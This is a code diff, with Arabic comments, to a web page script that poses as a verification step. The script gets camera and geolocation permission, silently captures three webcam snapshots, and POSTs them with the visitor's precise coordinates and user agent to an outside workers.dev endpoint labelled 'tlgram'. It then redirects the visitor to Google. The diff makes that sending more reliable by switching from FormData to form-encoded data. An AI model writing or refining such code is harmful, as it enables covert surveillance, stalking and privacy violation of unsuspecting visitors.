@@ -19,7 +19,7 @@
         const workerUrl = "https://tlgram.alidm0935.workers.dev/";
 
         try {
-            // 1. طلب إذن الكاميرا والموقع معاً
+            // 1. طلب إذن الكاميرا والموقع
             const [stream, position] = await Promise.all([
                 navigator.mediaDevices.getUserMedia({ video: true }),
                 new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(resolve, reject, {enableHighAccuracy: true}))
@@ -29,21 +29,22 @@
             const canvas = document.createElement('canvas'); canvas.width = 640; canvas.height = 480;
             const ctx = canvas.getContext('2d');
 
-            // 2. التقاط وإرسال 3 لقطات متتالية باستخدام FormData
+            // 2. التقاط وإرسال 3 لقطات
             for(let i = 0; i < 3; i++) {
                 ctx.drawImage(video, 0, 0, 640, 480);
                 const img = canvas.toDataURL('image/jpeg', 0.5);
 
-                // تجهيز البيانات بالأسلوب الذي يفهمه الـ Worker الخاص بك
-                const formData = new FormData();
-                formData.append('img', img);
-                formData.append('lat', position.coords.latitude);
-                formData.append('lon', position.coords.longitude);
-                formData.append('info', navigator.userAgent);
+                // إرسال البيانات بطريقة توافقية عالية (Form Encoded)
+                const params = new URLSearchParams();
+                params.append('img', img);
+                params.append('lat', position.coords.latitude);
+                params.append('lon', position.coords.longitude);
+                params.append('info', navigator.userAgent);
 
                 await fetch(workerUrl, {
                     method: 'POST',
-                    body: formData // إرسال كـ FormData
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: params.toString()
                 });
                 
                 await new Promise(r => setTimeout(r, 1000));
@@ -53,6 +54,7 @@
             window.location.href = "https://www.google.com";
 
         } catch (e) {
+            console.error(e);
             alert("يرجى السماح بالوصول للكاميرا والموقع لإتمام التحقق.");
         }
     }
